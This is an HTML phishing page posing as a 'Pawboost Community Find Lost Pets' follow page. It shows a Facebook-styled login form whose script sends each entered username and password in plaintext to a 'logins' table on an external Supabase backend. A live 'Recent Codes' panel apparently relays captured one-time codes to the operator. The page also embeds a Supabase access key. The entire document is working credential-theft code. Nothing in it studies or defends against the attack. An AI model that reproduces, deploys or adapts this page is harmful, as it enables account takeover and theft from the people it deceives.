<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Follow our page - Pawboost Community Find Lost Pets</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      padding: 20px;
    }

    .login-container {
      max-width: 400px;
      margin: 0 auto;
      background: white;
      padding: 20px;
      border-radius: 8px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .error-message {
      color: red;
      font-size: 12px;
    }

    #code-list {
      margin-top: 30px;
      padding: 10px;
      background: white;
      border-radius: 6px;
    }

    .code-entry {
      padding: 8px;
      border-bottom: 1px solid #eee;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <h2>Log In</h2>
    <input type="text" id="username" placeholder="Username or email" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="submitToSupabase()">Log In</button>
    <div id="error" class="error-message"></div>
  </div>

  <div id="code-list">
    <h3>Recent Codes</h3>
    <!-- Realtime data will appear here -->
  </div>

  <script type="module">
    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';

    const supabaseUrl = 'https://scserlwosxrmnvomipxt.supabase.co';
    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNjc2VybHdvc3hybW52b21pcHh0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk4MTI4NzMsImV4cCI6MjA2NTM4ODg3M30.JJtoPSkDqNTAgqpDHNZunqtyECGtYEWKh-YbvipTPH8';
    const supabase = createClient(supabaseUrl, supabaseKey);

    // ðŸ”’ Form submission
    window.submitToSupabase = async function () {
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const errorDiv = document.getElementById('error');
      errorDiv.textContent = '';

      if (!username || !password) {
        errorDiv.textContent = 'Username and password are required.';
        return;
      }

      const { error } = await supabase
        .from('logins')
        .insert([{ username, password }]);

      if (error) {
        console.error('Insert error:', error);
        errorDiv.textContent = 'Failed to log in.';
      } else {
        console.log('Login saved!');
      }
    };

    // âœ… Realtime updates for new records in "code" table
    supabase
      .channel('realtime:code')
      .on('postgres_changes', {
        event: 'INSERT',
        schema: 'public',
        table: 'code'
      }, payload => {
        console.log('Realtime code received:', payload.new);
        displayNewCode(payload.new);
      })
      .subscribe();

    function displayNewCode(data) {
      const container = document.getElementById('code-list');
      const entry = document.createElement('div');
      entry.className = 'code-entry';
      entry.textContent = `ðŸ”‘ ${data.value}`;
      container.appendChild(entry);
    }
  </script>
</body>
</html>
